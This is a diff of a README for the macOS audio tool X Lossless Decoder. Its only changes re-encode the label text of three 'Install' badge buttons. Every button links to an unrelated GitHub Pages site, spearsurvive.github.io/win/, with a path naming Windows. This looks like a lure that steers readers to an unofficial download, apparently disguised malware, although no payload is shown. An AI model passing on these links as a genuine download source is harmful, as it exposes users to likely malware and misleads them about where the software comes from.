@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X%20Lossless%20Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X+Lossless+Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ X Lossless Decoder (XLD) is a free macOS tool for decoding and converting lossle
 
 <div align="center">
 
-[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X%20Lossless%20Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X+Lossless+Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ X Lossless Decoder (XLD) is a free macOS tool for decoding and converting lossle
 
 <div align="center">
 
-[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X%20Lossless%20Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install X Lossless Decoder](https://img.shields.io/badge/⬇_Install_X+Lossless+Decoder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
